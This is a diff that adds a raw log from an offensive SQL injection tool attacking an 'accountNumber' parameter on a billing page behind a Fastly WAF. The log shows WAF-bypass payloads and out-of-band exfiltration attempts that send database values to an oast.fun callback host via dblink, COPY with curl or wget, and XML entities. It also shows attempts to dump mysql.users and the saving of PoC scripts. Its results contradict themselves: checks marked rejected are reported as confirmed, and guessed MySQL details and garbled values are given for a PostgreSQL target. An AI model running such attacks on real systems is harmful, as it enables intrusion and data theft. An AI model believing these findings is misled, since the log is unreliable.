@@ -1,0 +1,398 @@
+[*] testing 'PostgreSQL inline subquery' (param='accountNumber' req#14901)
+    [IN-inline] [PostgreSQL] req#11962 err=True status=200  ERROR found
+[*]     IN multi-probe: 3/2 passed
+[*]     IN clean probe (false-cond): error absent  confirmed
+[*] Running PCV on IN→IN detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (no-gap-above-threshold)
+[*]     Check C (error fingerprint): FAIL ()
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (0.609)
+[*]     Check B (timing canary): SKIPPED — skipped(non-timing tech=IN, no SLEEP/WAITFOR in payload)
+[*]   [PCV] Result: REJECTED  all checks failed (A=False C=False D=False B=False)
+[+] PCV FP-Guards PRIMARY CONFIRMED [IN→IN] PostgreSQL (L1-L6+Welch+FPV, conf=0.667) — boolean injection verified
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[+] PCV CONFIRMED [IN] PostgreSQL  injection verified!
+[+] Vulnerability confirmed  param='accountNumber' technique=IN dbms=PostgreSQL
+
+[!!] SQL INJECTION CONFIRMED  [IN] PostgreSQL  param='accountNumber'
+[+] Technique : IN  DBMS: PostgreSQL  Param: 'accountNumber'
+[+] Payload   : E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U007C%U002F%U002A%U002A%U002F%U002F%U002AAP%U002A%U002F%U007C%U002F%U0
+[+] Requests  : 14901
+
+[!!] SQL injection confirmed!
+    Parameter : 'accountNumber'
+    URL       : /account/billing?accountNumber=ACC-DF-9215311-90498-0
+    Technique : IN
+    DBMS      : PostgreSQL
+    Bypass    : tamper:semantic_eq+space2multicomment+swapmidcase
+    Confidence: 82%
+    Payload   : 'AC%43/*asb*/-DF-9215311/*k*/-90498/*t2I6IE*/-0E%(/*9rf4qE*/(27/*T*/))(%U00%3250A'
+    Requests  : 11965
+
+[*] Injection confirmed on 'accountNumber'  launching extraction — all scanning stopped
+[*] [Extraction] _extraction_first running: owner=True active=True param='accountNumber'
+[*] Extraction started for 'accountNumber'
+[+] Injection found via GET method!
+[*] Running PCV on IN→IN detection...
+[*]   [PCV] Computed exact payload on-the-fly (covers all techniques/DBMSes/surfaces)
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[+] [V25-Extract] Inline boolean oracle wired (tech='IN') — extraction can proceed despite ConditionalErrorOracle calibration failure
+[*] Using forced DBMS: PostgreSQL (--dbms flag)
+[+] DBMS: PostgreSQL  (conf=100%)
+[*] [MultiVector] Probing extraction methods for PostgreSQL...
+[+] [MultiVector] Available methods (fastestslowest): boolean(blind), timing(blind)
+[+] --- Auto-extraction starting ---
+[+] [Inference] Parsed tamper chain from det.notes: ['semantic_eq', 'space2multicomment', 'swapmidcase']
+[+] [Inference] Override tamper_chain with detection bypass: [] → ['semantic_eq', 'space2multicomment', 'swapmidcase']
+[+] [Inference] Detection payload: AC%43/*asb*/-DF-9215311/*k*/-90498/*t2I6IE*/-0E%(/*9rf4qE*/(27/*T*/))(
+[+] [Inference] DBMS: PostgreSQL | Tamper chain: ['semantic_eq', 'space2multicomment', 'swapmidcase']
+[+] [Inference] Template (boolean-append): AC%43/*asb*/-DF-9215311/*k*/-90498/*t2I6IE*/-0E%(/*9rf4qE*/(27/*T*/))(%U00%3250A
+[+] [Inference] No sleep value in detection payload — falling back to 3.0s (from config.time_sec)
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cooling down 5s before calibration...
+[*]     Check A (body canary): FAIL (SUBSTRING(non-derived-insufficient,gap=0.547,need>0.60-or-derived-pair))
+[*]     Check C (error fingerprint): FAIL ()
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (1.000)
+[!] Secondary PCV rejected [IN] candidate after full A-E evaluation — discarding this candidate only; original injection already confirmed, extraction continues unaffected
+[+] [*] Skipping extended surfaces  injection already confirmed
+[*] Waiting for extraction to complete...
+[+] [Inference] Calibrating with detection template (delay=3.0s)...
+[+] [Inference] Calibration 1: TRUE=149ms FALSE=185ms margin=-36ms
+[+] [Inference] Best margin: -36ms
+[+] [Inference] Boolean oracle not detected after 3 attempts
+[+] [Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...
+[+] [Inference] Wasserstein mean=0.000 n=12 (threshold=0.25)
+[+] [Inference]  Threshold=167ms (margin=-36ms)
+[!] [Inference] Timing oracle UNRELIABLE: margin=36ms < min=2400ms (CDN noise exceeds injection signal — timing extraction skipped)
+[!] [Inference] BUG-V214-A FIX: all standard oracles failed for non-timing technique 'IN' — attempting baseline-similarity oracle (CTX-bool style)
+[!] [Inference] Baseline-similarity oracle: sim_t=0.609 sim_f=0.609 gap=0.000
+[+] [Inference] No boolean oracle and timing unreliable  aborting extraction (re-run with longer sleep e.g. --time-sec 2 or wait for CDN cache expiry)
+[+] [Inference] No data extracted  trying side channels
+[+] [SchemaEnumV18] Inference returned no DB name — activating SchemaEnumeratorV18 enhanced enumerator
+[+] [SideChannel] DNS OOB extraction  xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [SideChannel] Advanced DNS: dblink
+[+] [SideChannel] Advanced DNS: copy_nslookup
+[+] [SideChannel] Advanced DNS: copy_curl
+[+] [SideChannel] HTTP exfil: copy_curl
+[+] [SideChannel] HTTP exfil: copy_wget
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[+] [SideChannel] No side channels  trying DIRECT extraction before MSE
+[+] [Direct] Detection payload (raw/wire): E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U002F%
+[+] [Direct] Detection payload (decoded): E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002
+[+] [Direct] No sleep or heavy-query pattern — skipping direct timing extraction
+[+] [Direct] Falling back to MSE timing
+[+] [Novel]  Starting 7 novel WAF bypass extraction techniques 
+[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)
+[+] [Novel-1] Testing WAF trigger 1/7: <script>alert(1)</script>...
+[+] [Novel]  WAF trigger #0 skipped: TRUE405==FALSE405 (no differentiation)
+[+] [Novel] Technique 2: Micro-timing (statistical sub-threshold delays)
+[+] [Novel-2] Micro-timing sample 1/10...
+[+] [Novel-2] Micro-timing sample 6/10...
+[+] [Novel]  Micro-timing not viable (noise too high)
+[+] [Novel] Technique 3: Resource bomb (asymmetric computation)
+[+] [Novel]  Resource bomb not viable (margin=22ms)
+[+] [Novel] Technique 4: Alternative DNS exfil vectors
+[+] [Novel] DNS vector 'dblink_connect' fired for user  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for user  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for user  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for user  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for database  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for database  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for database  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for database  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for version  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for version  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for version  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for version  check xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[+] [Novel] Technique 4: polling OAST for DNS callbacks (30s)...
+[+] [Novel] Technique 5: Connection pool exhaustion oracle
+[+] [Novel] Connection exhaustion test: status after lock = 405
+[+] [Novel] Technique 6: Write-then-read (two-stage)
+[+] [Novel]  Write-then-read response: <html>
+<head><title>405 Not Allowed</title></head>
+<body>
+<center><h1>405 Not Allowed</h1></cente
+[+] [Novel] Technique 7: Response splitting via config/session vars
+[+] [Novel]  Response splitting: NEW/CHANGED header x-timer = S1787272870.735461,VS0,VE115
+[+] [Novel] Technique 8: Conditional error type oracle
+[+] [Novel]  Error type 'cast_fail' viable: TRUE552 FALSE150 (length)
+[Novel] database: oracle sanity detected INVERTED polarity (always-false→True, 1=1→False); wrapping eval_fn and re-extracting length with corrected oracle
+[Novel] database: oracle sanity detected INVERTED polarity (always-false→True, 1=1→False); wrapping eval_fn to flip output and retrying extraction with corrected oracle
+[Novel] database: re-extracted length=127 with corrected oracle — starting char extraction
+[Novel] database: CHAR oracle sanity FAILED — oracle INVERTED (char always-false→True, evasive-true→False); aborting extraction
+[Novel] version: extracting [1/9] → '\U000c27e2'
+[Novel] version: extracting [5/9] → '\U000c27e2\U00085201ᘠ\U0008ad8b'
+[Novel] version: oracle DEGRADED at pos 6 (CDN/WAF now returning true_sig for always-false condition) — returning partial result '\U000c27e2\U00085201ᘠ\U0008ad8b'
+[Novel] version: extraction complete → '\U000c27e2\U00085201ᘠ\U0008ad8b'
+[+] [Novel]  Error-type version = 󂟢򅈁ᘠ򊶋
+[+] [Novel]  Extracted: {'version_split': 'S1787272870.735461,VS0,VE115'}
+[+] [SideChannel]  Extracting via side channels 
+[SideChannel] Auto-registered OOB domain: xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[SideChannel] DNS OOB: version()  xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[SideChannel] Sending 9 OOB methods...
+[SideChannel]   dblink_u_c0: dblink_connect_u DNS chunk 0 (bytes 1-30)
+[SideChannel]     status=200 (365ms) 
+[SideChannel]   dblink_u_c1: dblink_connect_u DNS chunk 1 (bytes 31-60)
+[SideChannel]     status=200 (234ms) 
+[SideChannel]   dblink_u_c2: dblink_connect_u DNS chunk 2 (bytes 61-90)
+[SideChannel]     status=200 (219ms) 
+[SideChannel]   dblink_u_c3: dblink_connect_u DNS chunk 3 (bytes 91-120)
+[SideChannel]     status=200 (191ms) 
+[SideChannel]   dblink_c0: dblink_connect DNS chunk 0 fallback (needs dblink extension)
+[SideChannel]     status=200 (259ms) 
+[SideChannel]   dblink_u_mx_c0: DbLiNk_CoNnEcT_u WAF case-bypass chunk 0
+[SideChannel]     status=200 (221ms) 
+[SideChannel]   dblink_u_mx_c1: DbLiNk_CoNnEcT_u WAF case-bypass chunk 1
+[SideChannel]     status=200 (193ms) 
+[SideChannel]   dblink_u_mx_c2: DbLiNk_CoNnEcT_u WAF case-bypass chunk 2
+[SideChannel]     status=200 (215ms) 
+[SideChannel]   dblink_u_mx_c3: DbLiNk_CoNnEcT_u WAF case-bypass chunk 3
+[SideChannel]     status=200 (245ms) 
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: current_catalog  xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[SideChannel] Sending 9 OOB methods...
+[SideChannel]   dblink_u_c0: dblink_connect_u DNS chunk 0 (bytes 1-30)
+[SideChannel]     status=200 (183ms) 
+[SideChannel]   dblink_u_c1: dblink_connect_u DNS chunk 1 (bytes 31-60)
+[SideChannel]     status=200 (212ms) 
+[SideChannel]   dblink_u_c2: dblink_connect_u DNS chunk 2 (bytes 61-90)
+[SideChannel]     status=200 (197ms) 
+[SideChannel]   dblink_u_c3: dblink_connect_u DNS chunk 3 (bytes 91-120)
+[SideChannel]     status=200 (248ms) 
+[SideChannel]   dblink_c0: dblink_connect DNS chunk 0 fallback (needs dblink extension)
+[SideChannel]     status=200 (191ms) 
+[SideChannel]   dblink_u_mx_c0: DbLiNk_CoNnEcT_u WAF case-bypass chunk 0
+[SideChannel]     status=200 (211ms) 
+[SideChannel]   dblink_u_mx_c1: DbLiNk_CoNnEcT_u WAF case-bypass chunk 1
+[SideChannel]     status=200 (205ms) 
+[SideChannel]   dblink_u_mx_c2: DbLiNk_CoNnEcT_u WAF case-bypass chunk 2
+[SideChannel]     status=200 (215ms) 
+[SideChannel]   dblink_u_mx_c3: DbLiNk_CoNnEcT_u WAF case-bypass chunk 3
+[SideChannel]     status=200 (272ms) 
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: current_user  xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[SideChannel] Sending 9 OOB methods...
+[SideChannel]   dblink_u_c0: dblink_connect_u DNS chunk 0 (bytes 1-30)
+[SideChannel]     status=200 (256ms) 
+[SideChannel]   dblink_u_c1: dblink_connect_u DNS chunk 1 (bytes 31-60)
+[SideChannel]     status=200 (201ms) 
+[SideChannel]   dblink_u_c2: dblink_connect_u DNS chunk 2 (bytes 61-90)
+[SideChannel]     status=200 (284ms) 
+[SideChannel]   dblink_u_c3: dblink_connect_u DNS chunk 3 (bytes 91-120)
+[SideChannel]     status=200 (170ms) 
+[SideChannel]   dblink_c0: dblink_connect DNS chunk 0 fallback (needs dblink extension)
+[SideChannel]     status=200 (224ms) 
+[SideChannel]   dblink_u_mx_c0: DbLiNk_CoNnEcT_u WAF case-bypass chunk 0
+[SideChannel]     status=200 (251ms) 
+[SideChannel]   dblink_u_mx_c1: DbLiNk_CoNnEcT_u WAF case-bypass chunk 1
+[SideChannel]     status=200 (242ms) 
+[SideChannel]   dblink_u_mx_c2: DbLiNk_CoNnEcT_u WAF case-bypass chunk 2
+[SideChannel]     status=200 (294ms) 
+[SideChannel]   dblink_u_mx_c3: DbLiNk_CoNnEcT_u WAF case-bypass chunk 3
+[SideChannel]     status=200 (241ms) 
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[+] [SideChannel]  Side-channel found no data  MSE will try next 
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=229ms)...
+[MSE]   raw/wire payload: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U002F%...
+[MSE]   untampered: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]  [Boolean] SimHash similarity also insufficient (sim=1.000) — no body oracle available
+[MSE]   err(div0): err200/33282B ok200/33282B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=512ms)...
+[MSE]   raw/wire payload: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U002F%...
+[MSE]   untampered: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]  [Boolean] SimHash similarity also insufficient (sim=1.000) — no body oracle available
+[MSE]   err(div0): err200/33282B ok200/33282B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=IN waf=Fastly  top methods: cham(75%), adapt(70%), bit(65%)
+[!] [Orchestrator] Boolean oracle pre-validation FAILED: sim gap=0.000 < 0.10 — oracle cannot distinguish true/false conditions (CDN cache serving identical pages for all SQL conditions). Skipping all boolean extraction methods (ChameleonExtractor, AdaptiveFreq, Bitwise, ZK, blind_extract).
+[+] [Orchestrator] Dictionary match: '8.0.36' (sim=1.000)
+[+]   Version:        8.0.36
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=219ms)...
+[MSE]   raw/wire payload: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U002F%...
+[MSE]   untampered: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]  [Boolean] SimHash similarity also insufficient (sim=1.000) — no body oracle available
+[MSE]   err(div0): err200/33282B ok200/33282B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=IN waf=Fastly  top methods: cham(75%), adapt(70%), bit(65%)
+[!] [Orchestrator] Boolean oracle pre-validation FAILED: sim gap=0.000 < 0.10 — oracle cannot distinguish true/false conditions (CDN cache serving identical pages for all SQL conditions). Skipping all boolean extraction methods (ChameleonExtractor, AdaptiveFreq, Bitwise, ZK, blind_extract).
+[+] [Orchestrator] Dictionary match: 'mysql' (sim=1.000)
+[+]   Database:       mysql
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=49ms)...
+[MSE]   raw/wire payload: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U002F%...
+[MSE]   untampered: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]  [Boolean] SimHash similarity also insufficient (sim=1.000) — no body oracle available
+[MSE]   err(div0): err200/33282B ok200/33282B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=IN waf=Fastly  top methods: cham(75%), adapt(70%), bit(65%)
+[!] [Orchestrator] Boolean oracle pre-validation FAILED: sim gap=0.000 < 0.10 — oracle cannot distinguish true/false conditions (CDN cache serving identical pages for all SQL conditions). Skipping all boolean extraction methods (ChameleonExtractor, AdaptiveFreq, Bitwise, ZK, blind_extract).
+[+] [Orchestrator] Dictionary match: 'root' (sim=1.000)
+[+]   User:           root
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=50ms)...
+[MSE]   raw/wire payload: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U002F%...
+[MSE]   untampered: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]  [Boolean] SimHash similarity also insufficient (sim=1.000) — no body oracle available
+[MSE]   err(div0): err200/33282B ok200/33282B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=IN waf=Fastly  top methods: cham(75%), adapt(70%), bit(65%)
+[!] [Orchestrator] Boolean oracle pre-validation FAILED: sim gap=0.000 < 0.10 — oracle cannot distinguish true/false conditions (CDN cache serving identical pages for all SQL conditions). Skipping all boolean extraction methods (ChameleonExtractor, AdaptiveFreq, Bitwise, ZK, blind_extract).
+[+] [Orchestrator] Dictionary match: 'mysql' (sim=1.000)
+[+]   Databases:      mysql
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=70ms)...
+[MSE]   raw/wire payload: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U002F%...
+[MSE]   untampered: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]  [Boolean] SimHash similarity also insufficient (sim=1.000) — no body oracle available
+[MSE]   err(div0): err200/33282B ok200/33282B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=IN waf=Fastly  top methods: cham(75%), adapt(70%), bit(65%)
+[!] [Orchestrator] Boolean oracle pre-validation FAILED: sim gap=0.000 < 0.10 — oracle cannot distinguish true/false conditions (CDN cache serving identical pages for all SQL conditions). Skipping all boolean extraction methods (ChameleonExtractor, AdaptiveFreq, Bitwise, ZK, blind_extract).
+[+] [Orchestrator] Dictionary match: 'users' (sim=1.000)
+[+]   Tables (mysql): users
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=48ms)...
+[MSE]   raw/wire payload: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U002F%...
+[MSE]   untampered: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]  [Boolean] SimHash similarity also insufficient (sim=1.000) — no body oracle available
+[MSE]   err(div0): err200/33282B ok200/33282B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=IN waf=Fastly  top methods: cham(75%), adapt(70%), bit(65%)
+[!] [Orchestrator] Boolean oracle pre-validation FAILED: sim gap=0.000 < 0.10 — oracle cannot distinguish true/false conditions (CDN cache serving identical pages for all SQL conditions). Skipping all boolean extraction methods (ChameleonExtractor, AdaptiveFreq, Bitwise, ZK, blind_extract).
+[+] [Orchestrator] Dictionary match: 'root' (sim=1.000)
+[+]   Columns (users): root
+[+] Dumping table: mysql.users
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=52ms)...
+[MSE]   raw/wire payload: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002A%U002A%U002F%U002F%...
+[MSE]   untampered: E%((27))(%U00250A%U002F%U002A%U002A%U002F%U00250A%U002F%U002...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]  [Boolean] SimHash similarity also insufficient (sim=1.000) — no body oracle available
+[MSE]   err(div0): err200/33282B ok200/33282B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=IN waf=Fastly  top methods: cham(75%), adapt(70%), bit(65%)
+[!] [Orchestrator] Boolean oracle pre-validation FAILED: sim gap=0.000 < 0.10 — oracle cannot distinguish true/false conditions (CDN cache serving identical pages for all SQL conditions). Skipping all boolean extraction methods (ChameleonExtractor, AdaptiveFreq, Bitwise, ZK, blind_extract).
+[+] [Orchestrator] Dictionary match: 'root' (sim=1.000)
+[+]   Columns: ['root']
+[!] [_extract_str] No oracle available for SQL: 'SELECT "root" FROM "mysql"."users" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "root" FROM "mysql"."users" LIMIT...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "root" FROM "mysql"."users" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "root" FROM "mysql"."users" LIMIT...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] Dumped 0 row(s) from mysql.users
+[+] --- Auto-extraction complete ---
+[+] Extraction report saved: output/extraction_report.json
+[+] PoC saved: output/poc/poc_accountNumber_IN.sh, output/poc/poc_accountNumber_IN.py
+[+] PoC: output/poc/poc_accountNumber_IN.sh
+[+] Remediation guide: output/remediation_accountNumber_IN.md
+[*] Extraction completed for 'accountNumber'
+[+] 
+
+[+] Scan complete   17613.43s
+[+] Requests sent   44439
+[+] DBMS            PostgreSQL
+[+] WAF             Fastly
+[+] Vulnerabilities 1 (accountNumber)
+[+] 
+[+] Deduplication: 2 findings  1 unique root causes
+[+] Report: 2 findings, 1 unique root causes
+[+] Report  output/sqlreaper_2981d893c9336b11_1787273345.json
+[+] Executive summary  output/executive_summary.txt
+[+] Confidence matrix  output/confidence_matrix.md
+[+] [Session] Scan complete  saved session cleared
+[+] Response dedup hit rate: 0.0%
